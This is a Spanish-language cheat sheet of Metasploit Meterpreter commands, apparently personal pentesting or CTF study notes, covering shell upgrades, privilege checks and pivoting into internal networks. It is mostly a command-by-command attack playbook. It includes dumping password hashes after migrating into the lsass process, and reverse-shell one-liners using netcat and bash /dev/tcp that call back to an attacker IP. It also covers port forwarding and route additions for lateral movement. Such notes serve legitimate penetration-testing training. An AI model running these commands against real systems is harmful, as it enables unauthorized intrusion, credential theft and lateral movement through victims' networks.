# Meterpreter

Tags: #Comandos #Meterpreter #Pivoting 

## Meterpreter 

Es un multi-funcional payload que es ejecutado en memoria en un sistema victima haciéndolo difícil de detectar. El se comunica a través de un socket stager y provee a un atacante un interpretado de comandos interactivo de un sistema victima que facilite la ejecución de comandos del sistema, navegación del sistema de archivos,  keylogging y mucho mas. 

## Convertir una Shell a Meterpreter

```bash 
# Debes de tener una sesion activa y en background en Metasploit 

❯ use post/multi/manage/shell_to_meterpreter
	❯ set LHOST <IP>
	❯ set session <ID>
	❯ run 

❯ sessions -l                # Miramos las sesiones activas, l (ele) = Listar 
❯ sessions -i <ID>           # Usar la sesion con Meterpreter
```

## Comandos con Meterpreter

```bash 
# Migrar a un proceso con mayores privilegios para tener un 'Meterpreter x64/Windows'

❯ hashdump                   # Te muestra todos los hashes de los usuarios, en dado caso que te salga este error 'Operation_failed: The parameter is incorrect', debemos de migrar a otro proceso.
	❯ pgrep lsass              # Mirar el numero del proceso 'lsass'  
	❯ migrate <ID>             # Nos migramos al proceso y asi poder mejorar la consola de Meterpreter, por lo que ahora podremos hacer el dumpeo de Hashes.  
```

```bash 
# Cuando tienes la sesion con Meterpreter 

❯ ctrl + z                   # Colocas la sesion en 'Background'
❯ background                 # Ponemos la sesion en segundo plano
❯ sessions                   # Miramos las sesiones activas 
❯ sessions -u <ID>           # Regresamos a la sesion pero le hacemos 'Upgrade' y ahoea sera con Meterpretermu


❯ sysinfo                    # Muestra informacion del Windows 
❯ getuid                     # Miramos el nombre del usuario 
❯ getprivs                   # Miramos los  procesos con privilegios 
❯ getsystem                  # Miras los procesos privilegiados 
❯ pgrep explorer             # Mirar el numero del proceso y asi poder escalar privilegios 
❯ search -f *.doc            # Buscar un archivo 

❯ shell                      # Nos carga una shell
	❯ /bin/bash -i          # Si no nos crea la Shell con el comando anterior, lo hacemos con este 
	❯ exit                  # Para salir de la sesion de 'Shell' y regresar a la sesion de 'Meterpreter'
❯ pwd                        # Nos muestra la ruta del dir actual 
❯ cd /                       # Nos dirigimos a la raiz 'C:\'
❯ cat file.txt               # Miramos el contenido de un archivo 

❯ upload /home/PowerUP.ps1   # Cargar un archivo desde la maquna Kali en la sesión establecida    
```

## Para hacer Pivoting con Metasploit 

```bash 
# Esto aplica si ya estas dentro de una maquina victima con Meterpreter


❯ arp                                     # Barrido ARP en la direccion IP dentro de Meterpreter, podremos ver las IP de las maquinas en otra red con las que se comunica la primer maquina victima
❯ ipconfig                                # Mirar la IP de nuestra interfaz de Meterpreter
 

1. Agregar la IP a la tabla de ruteo en Meterpreter y la conectividad es dentro de Metasploit
❯ run autoroute -s IP.0/24                # Agregas la IP a la tabla de ruteo para alcanzar la nueva red

2. Te sales de la sesion y puedes ver la tabla de ruteo
❯ Ctrl + z                                # Poner en background la sesion
❯ route print                             # Mirar la tabla de ruteo 

3. Fuera de la sesion usas el scanner para ver los puertos de la maquina agregada
❯ use auxiliary/scanner/portscan/tcp      # Hacer escaneo con Nmap
	❯ options 
	❯ set ports 1-1000                # Escanearemos los primero 1000 puertos 
	❯ set rhosts <IP>                 # Colocamos la IP de la maquina a la que no llegabamos porque estaba en otra red
	❯ run 

4. Haremos PortForwarding para tener conectividad fuera del Metasploit, los siguientes comandos los debemos de hacer dentro de la sesion de Meterpreter
❯ sessions ID                          # Usas la sesion con Meterpreter 
❯ portfwd add -l 4455 -p 445 -r IP     
❯ portfwd add -l 2222 -p 22 -r IP      # IP es del nuevo hosts el cual no podiamos alcanzar, l = El puerto a abrir en nuestra maquina de atacante, p = Puerto de la maquina victima a traer
❯ portfwd                              # Miramos las redirecciones de los puertos

5. # Ahora podemos hacer Nmap desde nuestra consola 
❯ nmap -p4455 localhost           

6. # Podemos usar modulos de Metasploit directamente en la IP de la maquina en la nueva red, ya que gracias al enrutamiento tenemos conectividad.
7. # Si queremos usar una 'Tool' especifica para un puerto en la consola, debemos de hacer 'PortForwarding' de ese puerto de la maquina victima a un puerto de nuestra maquina
❯ ssh root@127.0.0.1 -p 2222 
```

## Pivoting en una consola 'Linux' 

```bash 
# Esto aplica si ya estas dentro de la maquina victima 'Linux' con una consola 


1. # Una vez dentro de la maquina victima podemos hacer un barrido de ping para encontrar la otra maquina en la nueva red
❯ for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done                   # Linux barrido 'ping'
❯ for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.   # Windows barrido 'ping'

2. # En la maquina victima usaremos 'Netcat' para hacer una revershell al Metasploit de la maquina de atacante
❯ nc <IP> 443 -e /bin/bash 
# Segunda forma de hacer crear una Revershell desde la maquina victima en la consola
❯ bash -i >& /dev/tcp/10.10.14.13/443 0>&1

3. # Antes de ejecutar el comando anterior de la maquina victima, usaremos el 'Multi/handler' en la maquina de atacante para ponernos en escucha y asi recibir la conexion de la 'Revershell'

# Usaremos el Multihandler para tener una sesion, en caso de que la sesion sea 'Shell' usaremos el modulo de 'Shell_to_meterpreter' de lo contrario no sera necesario ya que nos otorga una sesion en Meterpreter y podemos saltar al paso '6'
❯ msfconsole -q                     # q = Quitar el banner de inicio

	❯ use multi/handler            # Así nos pondremos en escucha en nuestra maquina de atacante              
	❯ options
	❯ set LHOST 192.168.68.1       # IP de la maquina de atacante                 
	❯ set LPORT 433                # Puerto de escucha en la maquina de atacante 
	❯ run


4. # Despues de tener la sesión 'shell', hacemos lo siguiente:
shell❯

	❯ ipconfig             # Para ver todas las IP en la maquina victima 
	❯ Ctrl + z             # Para pasar la sesion a segundo plano


5. # Ahora usaremos el auxiliar 'shell_to_meterpreter'
❯ use post/multi/manage/shell_to_meterpreter
	❯ set LHOST <IP>
	❯ set session <ID>
	❯ set LPORT 443
	❯ run 

❯ sessions -l                # Miramos las sesiones activas, l (ele) = Listar 
❯ sessions -i <ID>           # Usar la sesion con Meterpreter


6. # Una vez dentro de la sesion de Meterpreter hacemos lo siguiente (Esto lo hacemos para verificar que si este funcionando la sesion con Meterpreter)
❯ ipconfig                   # Miramos las interfaces de red 

7. # Nos salimos de la sesion de Meterpreter para agregar las rutas de la red a alcanzar 
❯ ipconfig             # Para ver todas las IP en la maquina victima 
❯ Ctrl + z             # Para pasar la sesion a segundo plano

7.a # Agregamos la ruta de forma 'Manual' de la red en Metasploit
❯ route add IP.0/24 <ID>    # Agregamos la ruta de la red que no alcanzamos dentro de Metasploit, ID es de la sesion de Meterpreter activa
❯ route print               # Miramos la tabla de ruteo para confirmar la IP agregada
❯ route del IP.0/24 <ID>    # Eliminamos la ruta y su sesion (Opcional)

7.b # Agregamos la ruta de forma 'Automatica' de la red en Metasploit con un modulo. El modulo agregara todos los segmentos de red en los que la sesion con Meterpreter tenga comunicacion 
❯ use multi/manage/autoroute
	❯ options
	❯ set session <ID>     # Colocamos la sesion que tenemos abierta con Meterpreter
	❯ run

8. # Usaremos el modulo de escaneo de puertos de la maquina agregada
❯ use auxiliary/scanner/portscan/tcp      # Hacer escaneo con Nmap
	❯ options 
	❯ set ports 1-1000                # Escanearemos los primero 1000 puertos 
	❯ set rhosts <IP>                 # Colocamos la IP de la maquina a la que no llegabamos porque estaba en otra red
	❯ run 

9. # Usaremos la sesion de Meterpreter para hacer el 'Port Forwarding' y poder usar comandos desde nuestra consola fuera de Metasploit
❯ portfwd add -l 2233 -p 445 -r IP     # IP es del nuevo hosts el cual no podiamos alcanzar, l = El puerto a abrir en nuestra maquina de atacante, p = Puerto de la maquina victima a traer
❯ portfwd                              # Miramos las redirecciones de los puertos 

10. # Abrimos una consola para hacer 'Nmap' de la siguiente manera:
❯ nmap -p2233 localhost           # Ahora podemos hacer Nmap desde nuestra consola al puerto que abrimos que esta conectado al puerto de la maquina victima en la nueva red

11. # Podemos usar modulos de Metasploit directamente en la IP de la maquina en la nueva red, ya que gracias al enrutamiento tenemos conectividad. 
12. # Si queremos usar una 'Tool' especifica para un puerto en la consola, debemos de hacer 'PortForwarding' de ese puerto de la maquina victima a un puerto de nuestra maquina
```